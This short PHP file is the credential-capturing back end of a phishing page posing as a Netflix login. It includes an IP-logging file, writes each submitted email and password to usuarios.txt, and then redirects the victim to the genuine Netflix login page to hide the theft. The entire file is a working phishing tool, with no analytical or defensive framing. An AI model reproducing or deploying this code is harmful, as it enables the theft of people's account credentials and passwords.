<?php
include 'ip.php';

file_put_contents("usuarios.txt", "Cuenta: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/login');
exit();

